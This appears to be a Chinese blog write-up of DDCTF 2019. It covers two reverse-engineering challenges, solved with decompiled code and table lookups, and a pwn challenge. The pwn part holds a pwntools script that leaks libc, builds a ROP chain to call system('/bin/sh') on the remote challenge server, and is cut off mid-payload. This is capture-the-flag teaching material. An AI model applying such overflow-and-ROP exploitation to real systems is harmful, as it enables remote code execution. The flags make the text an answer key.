      <link href="/2019/04/16/CTF-2019%E5%B9%B44%E6%9C%88DDCTF/"/>
      <url>/2019/04/16/CTF-2019%E5%B9%B44%E6%9C%88DDCTF/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="0x01-reverse1-final"><a href="#0x01-reverse1-final" class="headerlink" title="0x01 reverse1_final"></a>0x01 reverse1_final</h2><p>先用esp定律脱壳，然后导入IDA</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">{</span><br><span class="line">  int result; // eax@2</span><br><span class="line">  char v4; // [sp+4h] [bp-804h]@1</span><br><span class="line">  char v5; // [sp+5h] [bp-803h]@1</span><br><span class="line">  char v6; // [sp+404h] [bp-404h]@1</span><br><span class="line">  char Dst; // [sp+405h] [bp-403h]@1</span><br><span class="line"></span><br><span class="line">  v6 = 0;</span><br><span class="line">  memset(&Dst, 0, 0x3FFu);</span><br><span class="line">  v4 = 0;</span><br><span class="line">  memset(&v5, 0, 0x3FFu);</span><br><span class="line">  printf("please input code:");</span><br><span class="line">  scanf("%s", &v6);</span><br><span class="line">  sub_401000(&v6);</span><br><span class="line">  if ( !strcmp(&v4, "DDCTF{reverseME}") )</span><br><span class="line">  {</span><br><span class="line">    printf("You've got it!!%s\n", &v4);</span><br><span class="line">    result = 0;</span><br><span class="line">  }</span><br><span class="line">  else</span><br><span class="line">  {</span><br><span class="line">    printf("Try again later.\n");</span><br><span class="line">    result = 0;</span><br><span class="line">  }</span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>进入sub_401000</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">unsigned int __cdecl sub_401000(const char *a1)</span><br><span class="line">{</span><br><span class="line">  _BYTE *v1; // ecx@0</span><br><span class="line">  unsigned int v2; // edi@1</span><br><span class="line">  unsigned int result; // eax@1</span><br><span class="line">  int v4; // ebx@2</span><br><span class="line"></span><br><span class="line">  v2 = 0;</span><br><span class="line">  result = strlen(a1);</span><br><span class="line">  if ( result )</span><br><span class="line">  {</span><br><span class="line">    v4 = a1 - v1;</span><br><span class="line">    do</span><br><span class="line">    {</span><br><span class="line">      *v1 = byte_402FF8[v1[v4]];</span><br><span class="line">      ++v2;</span><br><span class="line">      ++v1;</span><br><span class="line">      result = strlen(a1);</span><br><span class="line">    }</span><br><span class="line">    while ( v2 < result );</span><br><span class="line">  }</span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>推测是密码表，由于都是在寄存器内运算，ida反编译之后不利于分析，于是使用od动态调试<br>最后发现以下数据</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00402FF8                                       00 00 00 00 00 00 00 00</span><br><span class="line">00403000  49 B7 10 1F B6 48 EF E0 FF FF FF FF FF FF FF FF  I?禜镟</span><br><span class="line">00403010  FE FF FF FF 01 00 00 00 7E 7D 7C 7B 7A 79 78 77  ?...~}|{zyxw</span><br><span class="line">00403020  76 75 74 73 72 71 70 6F 6E 6D 6C 6B 6A 69 68 67  vutsrqponmlkjihg</span><br><span class="line">00403030  66 65 64 63 62 61 60 5F 5E 5D 5C 5B 5A 59 58 57  fedcba`_^]\[ZYXW</span><br><span class="line">00403040  56 55 54 53 52 51 50 4F 4E 4D 4C 4B 4A 49 48 47  VUTSRQPONMLKJIHG</span><br><span class="line">00403050  46 45 44 43 42 41 40 3F 3E 3D 3C 3B 3A 39 38 37  FEDCBA@?>=<;:987</span><br><span class="line">00403060  36 35 34 33 32 31 30 2F 2E 2D 2C 2B 2A 29 28 27  6543210/.-,+*)('</span><br><span class="line">00403070  26 25 24 23 22 21 20 00 01 00 00 00 88 2E 3B 00  &%$#"! ....?;.</span><br><span class="line">00403080  58 3C 3B                                         X<;</span><br></pre></td></tr></tbody></table></figure></div><p>它的算法是把输入的字符变成ascii，然后按照ascii作为位置在以上密码表中选出密文<br>所以算出变换后的对应表来找就好了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include<iostream></iostream></span><br><span class="line">#include<string></string></span><br><span class="line">using namespace std;</span><br><span class="line">int crypto[] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x49,0xB7,0x10,0x1F,0xB6,0x48,0xEF,0xE0,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFE,0xFF,0xFF,0xFF,0x01,0x00,0x00,0x00,0x7E,0x7D,0x7C,0x7B,0x7A,0x79,0x78,0x77,0x76,0x75,0x74,0x73,0x72,0x71,0x70,0x6F,0x6E,0x6D,0x6C,0x6B,0x6A,0x69,0x68,0x67,0x66,0x65,0x64,0x63,0x62,0x61,0x60,0x5F,0x5E,0x5D,0x5C,0x5B,0x5A,0x59,0x58,0x57,0x56,0x55,0x54,0x53,0x52,0x51,0x50,0x4F,0x4E,0x4D,0x4C,0x4B,0x4A,0x49,0x48,0x47,0x46,0x45,0x44,0x43,0x42,0x41,0x40,0x3F,0x3E,0x3D,0x3C,0x3B,0x3A,0x39,0x38,0x37,0x36,0x35,0x34,0x33,0x32,0x31,0x30,0x2F,0x2E,0x2D,0x2C,0x2B,0x2A,0x29,0x28,0x27,0x26,0x25,0x24,0x23,0x22,0x21,0x20,0x00,0x01,0x00,0x00,0x00,0x88,0x2E,0x3B,0x00,0x58,0x3C,0x3B };</span><br><span class="line">int main() {</span><br><span class="line">for (int i = 32; i <= 127; i++) {</span><br><span class="line"></span><br><span class="line">cout << (char)i << " -> " << (char)crypto[i] << endl;</span><br><span class="line">}</span><br><span class="line">//DDCTF{reverseME}</span><br><span class="line">//ZZ[JX#,9(9,+9QY!</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>所以FLAG为    ZZ[JX#,9(9,+9QY!</p><h2 id="0x02-reverse2-final"><a href="#0x02-reverse2-final" class="headerlink" title="0x02 reverse2_final"></a>0x02 reverse2_final</h2><p>先用esp定律脱壳，然后导入IDA</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">{</span><br><span class="line">  char Dest; // [sp+8h] [bp-C04h]@4</span><br><span class="line">  char v5; // [sp+9h] [bp-C03h]@4</span><br><span class="line">  char v6; // [sp+408h] [bp-804h]@1</span><br><span class="line">  char Dst; // [sp+409h] [bp-803h]@1</span><br><span class="line">  char v8; // [sp+808h] [bp-404h]@1</span><br><span class="line">  char v9; // [sp+809h] [bp-403h]@1</span><br><span class="line"></span><br><span class="line">  v6 = 0;</span><br><span class="line">  memset(&Dst, 0, 0x3FFu);</span><br><span class="line">  v8 = 0;</span><br><span class="line">  memset(&v9, 0, 0x3FFu);</span><br><span class="line">  printf("input code:");</span><br><span class="line">  scanf("%s", &v6);</span><br><span class="line">  if ( !(unsigned __int8)sub_4011F0() )</span><br><span class="line">  {</span><br><span class="line">    printf("invalid input\n");</span><br><span class="line">    exit(0);</span><br><span class="line">  }</span><br><span class="line">  sub_401240(&v8);</span><br><span class="line">  Dest = 0;</span><br><span class="line">  memset(&v5, 0, 0x3FFu);</span><br><span class="line">  sprintf(&Dest, "DDCTF{%s}", &v8);</span><br><span class="line">  if ( !strcmp(&Dest, "DDCTF{reverse+}") )</span><br><span class="line">    printf("You've got it !!! %s\n", &Dest);</span><br><span class="line">  else</span><br><span class="line">    printf("Something wrong. Try again...\n");</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>先进入sub_4011F0，会发现函数对输入的字符串做出了限制只能是0-9,A-F,输入的数量必须是偶数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">char __usercall sub_4011F0@<al>(const char *a1@<esi>)</esi></al></span><br><span class="line">{</span><br><span class="line">  signed int v1; // eax@1</span><br><span class="line">  signed int v2; // edx@1</span><br><span class="line">  int v3; // ecx@3</span><br><span class="line">  char v4; // al@4</span><br><span class="line"></span><br><span class="line">  v1 = strlen(a1);</span><br><span class="line">  v2 = v1;</span><br><span class="line">  if ( v1 && v1 % 2 != 1 )</span><br><span class="line">  {</span><br><span class="line">    v3 = 0;</span><br><span class="line">    if ( v1 <= 0 )</span><br><span class="line">      return 1;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    {</span><br><span class="line">      v4 = a1[v3];</span><br><span class="line">      if ( (v4 < 48 || v4 > 57) && (v4 < 65 || v4 > 70) )</span><br><span class="line">        break;</span><br><span class="line">      if ( ++v3 >= v2 )</span><br><span class="line">        return 1;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>根据执行结果，就是将字符串转化为十六进制，比如 输入AA 就转化为0xAA 输入BB 就转化为0xBB，然后执行sub_401000</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">int __usercall sub_401240@<eax>(const char *a1@<esi>, int a2)</esi></eax></span><br><span class="line">{</span><br><span class="line">  signed int v2; // edi@1</span><br><span class="line">  unsigned int v3; // edx@1</span><br><span class="line">  char v4; // bl@2</span><br><span class="line">  char v5; // al@3</span><br><span class="line">  char v6; // al@7</span><br><span class="line">  unsigned int v7; // ecx@11</span><br><span class="line">  char v9; // [sp+Bh] [bp-405h]@0</span><br><span class="line">  char v10; // [sp+Ch] [bp-404h]@1</span><br><span class="line">  char Dst; // [sp+Dh] [bp-403h]@1</span><br><span class="line"></span><br><span class="line">  v2 = strlen(a1);</span><br><span class="line">  v10 = 0;</span><br><span class="line">  memset(&Dst, 0, 0x3FFu);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  if ( v2 > 0 )</span><br><span class="line">  {</span><br><span class="line">    v4 = v9;</span><br><span class="line">    do</span><br><span class="line">    {</span><br><span class="line">      v5 = a1[v3];</span><br><span class="line">      if ( (unsigned __int8)(a1[v3] - 48) > 9u )</span><br><span class="line">      {</span><br><span class="line">        if ( (unsigned __int8)(v5 - 65) <= 5u )</span><br><span class="line">          v9 = v5 - 55;</span><br><span class="line">      }</span><br><span class="line">      else</span><br><span class="line">      {</span><br><span class="line">        v9 = a1[v3] - 48;</span><br><span class="line">      }</span><br><span class="line">      v6 = a1[v3 + 1];</span><br><span class="line">      if ( (unsigned __int8)(a1[v3 + 1] - 48) > 9u )</span><br><span class="line">      {</span><br><span class="line">        if ( (unsigned __int8)(v6 - 65) <= 5u )</span><br><span class="line">          v4 = v6 - 55;</span><br><span class="line">      }</span><br><span class="line">      else</span><br><span class="line">      {</span><br><span class="line">        v4 = a1[v3 + 1] - 48;</span><br><span class="line">      }</span><br><span class="line">      v7 = v3 >> 1;</span><br><span class="line">      v3 += 2;</span><br><span class="line">      *(&v10 + v7) = v4 | 16 * v9;</span><br><span class="line">    }</span><br><span class="line">    while ( (signed int)v3 < v2 );</span><br><span class="line">  }</span><br><span class="line">  return sub_401000(v2 / 2, a2);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>这个代码其实和re1是差不多的，同时我们发现了密码表byte_403020</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_401000(int a1, void *a2)</span><br><span class="line">{</span><br><span class="line">  char *v2; // ecx@0</span><br><span class="line">  int v3; // ebp@1</span><br><span class="line">  char *v4; // edi@1</span><br><span class="line">  signed int v5; // esi@1</span><br><span class="line">  unsigned __int8 v6; // bl@2</span><br><span class="line">  signed int v7; // esi@3</span><br><span class="line">  int v8; // edi@10</span><br><span class="line">  int v9; // edi@13</span><br><span class="line">  size_t v10; // esi@15</span><br><span class="line">  void *v11; // edi@15</span><br><span class="line">  const void *v12; // eax@15</span><br><span class="line">  unsigned __int8 Dst; // [sp+14h] [bp-38h]@2</span><br><span class="line">  unsigned __int8 v15; // [sp+15h] [bp-37h]@2</span><br><span class="line">  unsigned __int8 v16; // [sp+16h] [bp-36h]@3</span><br><span class="line">  char v17; // [sp+18h] [bp-34h]@3</span><br><span class="line">  char v18; // [sp+19h] [bp-33h]@3</span><br><span class="line">  char v19; // [sp+1Ah] [bp-32h]@3</span><br><span class="line">  char i; // [sp+1Bh] [bp-31h]@3</span><br><span class="line">  void *v21; // [sp+1Ch] [bp-30h]@1</span><br><span class="line">  char v22; // [sp+20h] [bp-2Ch]@1</span><br><span class="line">  void *Src; // [sp+24h] [bp-28h]@15</span><br><span class="line">  size_t Size; // [sp+34h] [bp-18h]@15</span><br><span class="line">  unsigned int v25; // [sp+38h] [bp-14h]@15</span><br><span class="line">  int v26; // [sp+48h] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  v3 = a1;</span><br><span class="line">  v4 = v2;</span><br><span class="line">  v21 = a2;</span><br><span class="line">  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(&v22);</char></char,std::char_traits<char></char></char,std::char_traits<char></span><br><span class="line">  v5 = 0;</span><br><span class="line">  v26 = 0;</span><br><span class="line">  if ( a1 )</span><br><span class="line">  {</span><br><span class="line">    do</span><br><span class="line">    {</span><br><span class="line">      *(&Dst + v5) = *v4;</span><br><span class="line">      v6 = v15;</span><br><span class="line">      ++v5;</span><br><span class="line">      --v3;</span><br><span class="line">      ++v4;</span><br><span class="line">      if ( v5 == 3 )</span><br><span class="line">      {</span><br><span class="line">        v17 = Dst >> 2;</span><br><span class="line">        v18 = (v15 >> 4) + 16 * (Dst & 3);</span><br><span class="line">        v19 = (v16 >> 6) + 4 * (v15 & 0xF);</span><br><span class="line">        i = v16 & 0x3F;</span><br><span class="line">        v7 = 0;</span><br><span class="line">        do</span><br><span class="line">          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator+=(</char></char,std::char_traits<char></span><br><span class="line">            &v22,</span><br><span class="line">            (unsigned __int8)(byte_403020[(unsigned __int8)*(&v17 + v7++)] ^ 0x76));</span><br><span class="line">        while ( v7 < 4 );</span><br><span class="line">        v5 = 0;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    while ( v3 );</span><br><span class="line">    if ( v5 )</span><br><span class="line">    {</span><br><span class="line">      if ( v5 < 3 )</span><br><span class="line">      {</span><br><span class="line">        memset(&Dst + v5, 0, 3 - v5);</span><br><span class="line">        v6 = v15;</span><br><span class="line">      }</span><br><span class="line">      v18 = (v6 >> 4) + 16 * (Dst & 3);</span><br><span class="line">      v17 = Dst >> 2;</span><br><span class="line">      v19 = (v16 >> 6) + 4 * (v6 & 0xF);</span><br><span class="line">      v8 = 0;</span><br><span class="line">      for ( i = v16 & 0x3F; v8 < v5 + 1; ++v8 )</span><br><span class="line">        std::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator+=(</char></char,std::char_traits<char></span><br><span class="line">          &v22,</span><br><span class="line">          (unsigned __int8)(byte_403020[(unsigned __int8)*(&v17 + v8)] ^ 0x76));</span><br><span class="line">      if ( v5 < 3 )</span><br><span class="line">      {</span><br><span class="line">        v9 = 3 - v5;</span><br><span class="line">        do</span><br><span class="line">        {</span><br><span class="line">          std::basic_string<char,std::char_traits<char>,std::allocator<char>>::operator+=(&v22, 61);</char></char,std::char_traits<char></span><br><span class="line">          --v9;</span><br><span class="line">        }</span><br><span class="line">        while ( v9 );</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  v10 = Size;</span><br><span class="line">  v11 = v21;</span><br><span class="line">  memset(v21, 0, Size + 1);</span><br><span class="line">  v12 = Src;</span><br><span class="line">  if ( v25 < 0x10 )</span><br><span class="line">    v12 = &Src;</span><br><span class="line">  memcpy(v11, v12, v10);</span><br><span class="line">  v26 = -1;</span><br><span class="line">  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string<char,std::char_traits<char>,std::allocator<char>>();</char></char,std::char_traits<char></char></char,std::char_traits<char></span><br><span class="line">  return sub_40145E();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>由于每加密之后都要异或一次，不如我们先对密码表进行第一次还原，即异或0x76</p><h3 id="发现密码表是有规律的"><a href="#发现密码表是有规律的" class="headerlink" title="发现密码表是有规律的"></a>发现密码表是有规律的</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0003f000 "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/wvvv頧LvN;Lvvvvv</span><br></pre></td></tr></tbody></table></figure></div><h2 id="总结：就是输入的字符两两变成十六进制，然后取左边6位作为key取出密码表的字符，不够则用0填充"><a href="#总结：就是输入的字符两两变成十六进制，然后取左边6位作为key取出密码表的字符，不够则用0填充" class="headerlink" title="总结：就是输入的字符两两变成十六进制，然后取左边6位作为key取出密码表的字符，不够则用0填充"></a>总结：就是输入的字符两两变成十六进制，然后取左边6位作为key取出密码表的字符，不够则用0填充</h2><h3 id="所以我们先算出密文在密码表的位置"><a href="#所以我们先算出密文在密码表的位置" class="headerlink" title="所以我们先算出密文在密码表的位置"></a>所以我们先算出密文在密码表的位置</h3><p>r   e   v    e  r   s    e  +<br>43 30 47 30 43 44 30 62</p><h3 id="转化为二进制，然后六个六个分割"><a href="#转化为二进制，然后六个六个分割" class="headerlink" title="转化为二进制，然后六个六个分割"></a>转化为二进制，然后六个六个分割</h3><p>10101101 11101011 11011110 10101110 11000111 10111110</p><h3 id="然后转化为ascii，即为flag"><a href="#然后转化为ascii，即为flag" class="headerlink" title="然后转化为ascii，即为flag"></a>然后转化为ascii，即为flag</h3><p>ADEBDEAEC7BE</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="0x01-pwn-strike"><a href="#0x01-pwn-strike" class="headerlink" title="0x01 pwn strike"></a>0x01 pwn strike</h3><p>第一次输入溢出ebp，第二次输入负数绕过if并且无限长的读入<br>然后溢出libc，然后再跳会main函数<br>但是直接跳回main函数会导致ebp无法溢出，所以必须跳到start上，对数据进行初始化<br>然后rop跳到libc空间然后执行system拿到shell</p><h2 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下"></a>exp如下</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">#sh = process("xpwn")</span><br><span class="line">sh = remote("116.85.48.105",5005)</span><br><span class="line">pop_edx_ret = 0x08048411</span><br><span class="line">input()</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline('a'*0x40)</span><br><span class="line">sh.recvuntil('a'*0x40)</span><br><span class="line">ebp = u32(sh.recv()[8:12])</span><br><span class="line">print "[+] ebp = " + hex(ebp) </span><br><span class="line">sh.sendline('-7.3')</span><br><span class="line">size = 78</span><br><span class="line">libc = ELF('libc.so.6')</span><br><span class="line">elf = ELF('xpwn')</span><br><span class="line">start_addr = 0x080484E0</span><br><span class="line">vul_addr = 0x0804862D</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">read_plt = elf.plt['read']</span><br><span class="line">padding = p32(elf.plt['puts']) + p32(0x08048669) + p32(elf.got['__libc_start_main']) + p32(1)  </span><br><span class="line">payload ='a'*10+ padding+'a'*52 + p32(ebp-72) + 'a' * 4 + p32(ebp) + 'a' * 112</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">print sh.recvuntil("bye!\x0a")</span><br><span class="line">libc_start_main = u32(sh.recv(4))</span><br><span class="line">print "[+] __libc_start_main :"+hex(libc_start_main)</span><br><span class="line">#--------------------------------------</span><br><span class="line">sh.sendline('a'*0x40)</span><br><span class="line">sh.recvuntil('a'*0x40)</span><br><span class="line">ebp = u32(sh.recv()[8:12])</span><br><span class="line">sh.sendline('-9.5')</span><br><span class="line">sh.recv()</span><br><span class="line">print "[+] ebp = " + hex(ebp)</span><br><span class="line">print "[+] base = "+ hex(libc.symbols['__libc_start_main']-libc_start_main)</span><br><span class="line">print "[+] system_addr"+hex(libc.symbols['system']-(libc.symbols['__libc_start_main']-libc_start_main))</span><br><span class="line">binshell = next(libc.search('/bin/sh\0'))</span><br><span class="line">padding = p32(libc.symbols['system']-(libc.symbols['__libc_start_main']-libc_start_main)) + p32(0) + p32(binshell -(libc.symbols['__libc_start_main']-libc_start_main))</span><br><span class="line">payload ='a'*60 + p32(ebp-60) + p32(ebp)  + 